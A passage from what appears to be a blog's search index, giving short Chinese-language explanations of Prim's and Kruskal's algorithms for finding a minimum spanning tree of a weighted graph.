title="&#x3D;&#x3D;Prim算法（普里姆）&#x3D;&#x3D;"></a>&#x3D;&#x3D;Prim算法（普里姆）&#x3D;&#x3D;</h3><p>思想：首先，选一个顶点作为起点，选哪个都可以；然后呢，它在选边的时候把图里面的顶点分成了两个集合，一个集合是已经被选到的结点组成的集合，另一个集合是剩下的结点组成的集合。<br>每次选边的时候是从<strong>两个集合中的顶点直接相连的边中选取权值最小的那一条。</strong></p><p>&#x3D;&#x3D;Kruskal算法（克鲁斯卡尔）&#x3D;&#x3D;<br>算法思想：<br>任给一个有n个顶点的连通图N&#x3D;{V,E}，<br>首先构造一个由这n个顶点组成、不含任何边的图G&#x3D;{V,NULL}，其中每个顶点自成一个连通分量（集合），其次不断从E中取出权值最小的一条边(若有多条权值相等任取其一)，若该边的两个顶点来自不同的连通分量，则将此边加入到G中。如此重复，直到所有顶点在同一个连通分量上为止。<br>核心：每次迭代时，选出一条具有最小权值的边，且边的两端点不在同一连通分量（集合）上，则加入生成树。<br>&#x3D;&#x3D;其实就是每次从图中还未被选到的所有的边里面选出权值最小且不会构成环的边，选够n-1条就完成了，这n-1条边构成的生成树就是该图对应的最小生成树。&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> Data structure </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
